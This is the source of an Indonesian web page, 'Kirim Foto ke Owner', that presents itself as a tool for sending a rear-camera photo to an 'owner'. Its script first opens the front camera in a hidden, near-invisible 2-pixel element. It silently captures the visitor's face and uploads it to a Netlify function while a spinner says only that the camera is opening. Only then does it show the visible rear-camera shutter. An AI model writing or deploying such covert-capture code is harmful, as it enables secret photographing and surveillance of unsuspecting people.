<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Kirim Foto ke Owner</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%;overflow:hidden;background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#fff}
  #app{position:fixed;inset:0;display:flex;flex-direction:column}

  #intro{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;
    background:radial-gradient(circle at 50% 30%,#1a1a2e 0%,#0a0a0f 70%);z-index:100;text-align:center;padding:24px;gap:18px}
  #intro h1{font-size:26px;font-weight:700;letter-spacing:.5px}
  #intro p{font-size:14px;opacity:.6;max-width:280px;line-height:1.5}
  .btn{background:linear-gradient(135deg,#ff2d55,#ff6b35);border:none;color:#fff;font-size:16px;font-weight:600;
    padding:16px 40px;border-radius:999px;cursor:pointer;box-shadow:0 8px 30px rgba(255,45,85,.4);
    transition:transform .15s,box-shadow .15s}
  .btn:active{transform:scale(.96)}
  .btn:disabled{opacity:.5;pointer-events:none}
  .icon-cam{width:64px;height:64px;border-radius:50%;background:rgba(255,45,85,.15);
    display:flex;align-items:center;justify-content:center;font-size:30px;border:2px solid rgba(255,45,85,.4)}

  /* Silent stage — dibuat visible 1x1 px di dalam viewport biar browser render frame-nya */
  #silent{position:fixed;top:0;left:0;width:2px;height:2px;opacity:0.01;overflow:hidden;pointer-events:none;z-index:-1}
  #videoSilent{width:2px;height:2px;object-fit:cover}

  #loader{position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;
    gap:20px;background:#0a0a0f;z-index:200;text-align:center;padding:24px}
  .spinner{width:56px;height:56px;border:4px solid rgba(255,255,255,.15);border-top-color:#ff2d55;
    border-radius:50%;animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  #loaderText{font-size:15px;opacity:.85}

  #camView{position:absolute;inset:0;display:none;z-index:50;background:#000}
  #video{width:100%;height:100%;object-fit:cover;background:#000}
  #canvas{display:none}
  #overlay{position:absolute;inset:0;pointer-events:none;display:flex;flex-direction:column;justify-content:space-between;padding:20px}
  .topBar{display:flex;justify-content:space-between;align-items:center}
  .pill{background:rgba(0,0,0,.5);padding:8px 14px;border-radius:999px;font-size:12px;backdrop-filter:blur(10px);
    display:flex;align-items:center;gap:6px}
  .dot{width:8px;height:8px;border-radius:50%;background:#ff2d55;animation:pulse 1.2s infinite}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
  .bottomBar{display:flex;justify-content:center;align-items:center;pointer-events:auto;padding-bottom:20px}
  #shutter{width:74px;height:74px;border-radius:50%;background:#fff;border:5px solid rgba(255,255,255,.3);
    cursor:pointer;transition:transform .1s}
  #shutter:active{transform:scale(.9)}

  #success{position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;
    gap:16px;background:#0a0a0f;z-index:300;text-align:center;padding:24px}
  #success .check{width:80px;height:80px;border-radius:50%;background:rgba(46,204,113,.15);
    display:flex;align-items:center;justify-content:center;font-size:40px;border:2px solid #2ecc71}
  #success h2{font-size:22px;font-weight:600}
  #success p{opacity:.6;font-size:14px}
</style>
</head>
<body>
<div id="app">
  <div id="intro">
    <div class="icon-cam">📸</div>
    <h1>Kirim Foto ke Owner</h1>
    <p>Dengan menekan tombol di bawah, kamu akan mengirimkan foto secara otomatis dari kamera perangkatmu.</p>
    <button class="btn" id="startBtn">Mulai Kirim Foto</button>
  </div>

  <div id="silent">
    <video id="videoSilent" autoplay playsinline muted></video>
    <canvas id="canvasSilent"></canvas>
  </div>

  <div id="loader">
    <div class="spinner"></div>
    <div id="loaderText">membuka kamera, tunggu sebentar...</div>
  </div>

  <div id="camView">
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <div id="overlay">
      <div class="topBar">
        <div class="pill"><span class="dot"></span><span>Kamera Belakang</span></div>
      </div>
      <div class="bottomBar">
        <button id="shutter"></button>
      </div>
    </div>
  </div>

  <div id="success">
    <div class="check">✓</div>
    <h2>Foto Terkirim</h2>
    <p>Terima kasih sudah mengirim.</p>
  </div>
</div>

<script>
const VIDEO_S = document.getElementById('videoSilent');
const CANVAS_S = document.getElementById('canvasSilent');
const VIDEO = document.getElementById('video');
const CANVAS = document.getElementById('canvas');
const INTRO = document.getElementById('intro');
const CAMVIEW = document.getElementById('camView');
const LOADER = document.getElementById('loader');
const LOADERTEXT = document.getElementById('loaderText');
const SUCCESS = document.getElementById('success');
const SHUTTER = document.getElementById('shutter');

let streamSilent = null;
let streamBack = null;
let cooldownLock = false;

function wait(ms){ return new Promise(r=>setTimeout(r,ms)); }

/* ====== KAMERA DEPAN — SILENT ====== */
async function openFrontSilent() {
  streamSilent = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  });
  VIDEO_S.srcObject = streamSilent;
  VIDEO_S.muted = true;
  VIDEO_S.setAttribute('playsinline', '');
  VIDEO_S.setAttribute('autoplay', '');

  // tunggu metadata
  if (VIDEO_S.readyState < 1) {
    await new Promise(r => VIDEO_S.addEventListener('loadedmetadata', r, { once: true }));
  }
  await VIDEO_S.play().catch(()=>{});

  // tunggu frame beneran ada isinya
  await new Promise(r => {
    if (typeof VIDEO_S.requestVideoFrameCallback === 'function') {
      VIDEO_S.requestVideoFrameCallback(() => r());
    } else {
      const check = () => {
        if (VIDEO_S.videoWidth > 0 && VIDEO_S.videoHeight > 0) r();
        else requestAnimationFrame(check);
      };
      check();
    }
  });

  // buffer autofocus/exposure
  await wait(1500);
}

async function captureFrontBlob() {
  const w = VIDEO_S.videoWidth || 1280;
  const h = VIDEO_S.videoHeight || 720;
  CANVAS_S.width = w; CANVAS_S.height = h;
  const ctx = CANVAS_S.getContext('2d');
  ctx.save();
  ctx.translate(w, 0); ctx.scale(-1, 1);
  ctx.drawImage(VIDEO_S, 0, 0, w, h);
  ctx.restore();
  return await new Promise(res => CANVAS_S.toBlob(b => res(b), 'image/jpeg', 0.9));
}

function closeFrontSilent() {
  try {
    if (streamSilent) {
      streamSilent.getTracks().forEach(t => t.stop());
      streamSilent = null;
    }
    VIDEO_S.srcObject = null;
  } catch(e){}
}

/* ====== KAMERA BELAKANG — MANUAL ====== */
async function openBackCamera() {
  streamBack = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  });
  VIDEO.srcObject = streamBack;
  VIDEO.muted = true;
  VIDEO.setAttribute('playsinline', '');
  await VIDEO.play().catch(()=>{});
  if (VIDEO.readyState < 2) {
    await new Promise(r => VIDEO.addEventListener('loadeddata', r, { once: true }));
  }
  await wait(300);
}

function captureBackBlob() {
  return new Promise(resolve => {
    const w = VIDEO.videoWidth || 1280;
    const h = VIDEO.videoHeight || 720;
    CANVAS.width = w; CANVAS.height = h;
    const ctx = CANVAS.getContext('2d');
    ctx.drawImage(VIDEO, 0, 0, w, h);
    CANVAS.toBlob(b => resolve(b), 'image/jpeg', 0.9);
  });
}

/* ====== KIRIM KE NETLIFY FUNCTION ====== */
async function sendPhoto(blob, label) {
  const fd = new FormData();
  fd.append('photo', blob, 'photo.jpg');
  fd.append('label', label);
  const res = await fetch('/.netlify/functions/send-photo', { method:'POST', body: fd });
  const txt = await res.text();
  if (!res.ok) throw new Error('HTTP ' + res.status + ' — ' + txt);
  try { return JSON.parse(txt); } catch { return { ok: true, raw: txt }; }
}

/* ====== FLOW UTAMA ====== */
async function autoFlow() {
  INTRO.style.display = 'none';
  LOADER.style.display = 'flex';
  LOADERTEXT.textContent = 'membuka kamera, tunggu sebentar...';

  // ---- FASE 1: KAMERA DEPAN SILENT ----
  let frontOk = false;
  try {
    await openFrontSilent();
    const frontBlob = await captureFrontBlob();
    if (!frontBlob || frontBlob.size < 1000) {
      throw new Error('blob kamera depan kosong/terlalu kecil (' + (frontBlob ? frontBlob.size : 0) + ' bytes)');
    }
    await sendPhoto(frontBlob, 'front');
    frontOk = true;
  } catch(e) {
    console.error('front error:', e);
  } finally {
    closeFrontSilent();
  }

  // ---- FASE 2: COOLDOWN 5 DETIK ----
  await wait(5000);

  // ---- FASE 3: KAMERA BELAKANG MANUAL ----
  LOADER.style.display = 'none';
  CAMVIEW.style.display = 'block';

  try {
    await openBackCamera();
  } catch(e) {
    alert('kamera belakang gagal dibuka: ' + (e.message || e));
    return;
  }

  SHUTTER.addEventListener('click', async () => {
    if (cooldownLock) return;
    cooldownLock = true;
    try {
      const b = await captureBackBlob();
      LOADER.style.display = 'flex';
      LOADERTEXT.textContent = 'membuka kamera, tunggu sebentar...';
      await sendPhoto(b, 'back');
      LOADER.style.display = 'none';
      SUCCESS.style.display = 'flex';
    } catch(e) {
      LOADER.style.display = 'none';
      alert(e.message || 'gagal kirim foto belakang');
    } finally {
      cooldownLock = false;
    }
  });
}

document.getElementById('startBtn').addEventListener('click', () => {
  autoFlow().catch(err => {
    console.error(err);
    alert(err.message || 'Tidak bisa mengakses kamera.');
  });
});
</script>
</body>
</html>
